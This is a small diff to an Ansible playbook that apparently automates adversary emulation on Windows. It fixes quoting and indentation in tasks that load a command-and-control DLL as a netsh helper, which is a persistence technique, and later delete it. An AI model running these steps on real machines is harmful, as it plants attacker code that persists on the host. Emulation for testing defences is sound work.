@@ -9,7 +9,7 @@
     - name: execute malicious dll
       win_shell: |
         cd c:\temp
-        netsh.exe add helper {{ cnc_dll }}
+        "netsh.exe add helper {{ cnc_dll }}"
     - name: check file exist
       tags: always
       win_stat:
@@ -27,4 +27,4 @@
       win_command: |
         del C:\temp\{{ cnc_dll }}
         del C:\temp\evil.txt
-       win_shell: netsh.exe del helper {{ cnc_dll }}
+      win_shell: "netsh.exe del helper {{ cnc_dll }}"
